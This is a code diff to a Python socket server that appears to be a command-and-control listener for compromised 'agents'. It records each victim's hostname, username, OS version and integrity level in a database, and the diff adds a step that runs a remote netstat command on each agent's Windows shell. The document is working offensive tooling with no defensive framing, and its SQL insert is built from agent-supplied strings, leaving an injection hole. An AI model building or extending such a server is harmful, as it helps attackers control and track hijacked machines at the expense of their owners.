@@ -11,7 +11,7 @@ connections_lock = threading.Lock()
 
 def socket_server():
     global connections 
-    HOST = "192.168.25.1"
+    HOST = "0.0.0.0"
     PORT = 9999
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -29,10 +29,11 @@ def socket_server():
                 else:
                     print(f"[+] {ip} just joined.")
                     identifier = generate_identifier()
-                    information = recv_information(conn)
+                    information = recv_information(conn,PORT)
                     hostname = information['hostname'][-1]
                     username = information['username'][-1]
                     osVersion = information['os_version'][-1]
+                    connectedTo = information['connected_to']
                     db_ipAddr = db.execute("SELECT ipAddress FROM all_agents").fetchall()
                     ipAddr_list = [ipAddr[0] for ipAddr in db_ipAddr]
                     if ip in ipAddr_list:
@@ -40,7 +41,7 @@ def socket_server():
                         identifier = identifier[0]
                         db.execute("UPDATE all_agents SET status='Alive' where ipAddress=?", (ip,))
                     else:
-                        query = f"INSERT into all_agents (identifier, ipAddress, hostname, username, status, lastCheckin, integrity, operatingSystem) VALUES ('{identifier}', '{ip}', '{hostname}', '{username}', 'Alive', '{str(int(time.time()-time.time())) + ' seconds ago'}', 'Low', '{osVersion}')"
+                        query = f"INSERT into all_agents (identifier, ipAddress, hostname, username, status, lastCheckin, integrity, operatingSystem, connectedTo) VALUES ('{identifier}', '{ip}', '{hostname}', '{username}', 'Alive', '{str(int(time.time()-time.time())) + 'seconds ago'}', 'Low', '{osVersion}', '{connectedTo}')"
                         db.execute(query)
                     db.commit()
                     client_info = [ip, conn, time.time(), username, hostname, osVersion, identifier]
@@ -61,7 +62,7 @@ def generate_identifier(length=5):
             if all(conn[6] != identifier for conn in connections) and identifier not in identifier_list:
                 return identifier
  
-def recv_information(conn):
+def recv_information(conn,PORT):
     information = {}
     conn.send(b"\n")
     time.sleep(1)
@@ -89,6 +90,14 @@ def recv_information(conn):
     information['os_version'].pop()
     information['os_version'] = [empty for empty in information['os_version'] if empty]
     information['os_version'][-1] = information['os_version'][-1].strip()
+
+    # IP address agent is connected to
+    conn.send(f'netstat -an | findstr "{PORT}" | findstr "ESTABLISHED"'.encode() + b"\n")
+    time.sleep(3) # the longer, the more reliable :P
+    response = conn.recv(2048).decode().replace('\r', '')
+    connection_info = response.split('   ')[2] # receive the IP and port the agent connected to
+    connected_IP = connection_info.split(':')[0] # retrieve IP only
+    information['connected_to'] = connected_IP
 
     return information
 
